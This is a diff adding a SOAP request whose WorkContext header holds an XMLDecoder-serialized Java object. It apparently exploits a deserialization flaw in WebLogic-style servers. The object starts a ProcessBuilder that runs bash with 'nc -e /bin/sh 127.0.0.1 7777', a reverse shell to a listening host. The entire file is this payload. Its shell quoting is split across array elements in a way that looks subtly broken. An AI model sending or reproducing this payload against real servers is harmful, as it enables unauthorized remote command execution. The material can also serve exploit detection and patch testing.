@@ -1,0 +1,34 @@
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Header>
+    <work:WorkContext xmlns:work="">
+        <java version="1.8.0_131" class="java.beans.XMLDecoder">
+          <void class="java.lang.ProcessBuilder">
+            <array class="java.lang.String" length="7">
+              <void index="0">
+                <string>/bin/bash</string>
+              </void>
+              <void index="1">
+                <string>-c</string>
+              </void>
+              <void index="2">
+                <string>'nc</string>
+              </void>
+              <void index="3">
+                <string>-e</string>
+              </void>
+              <void index="4">
+                <string>/bin/sh</string>
+              </void>
+              <void index="5">
+                <string>127.0.0.1</string>
+              </void>
+              <void index="6">
+                <string>7777'</string>
+              </void>
+            </array>
+          <void method="start"/></void>
+        </java>
+      </work:WorkContext>
+    </soapenv:Header>
+  <soapenv:Body/>
+</soapenv:Envelope>
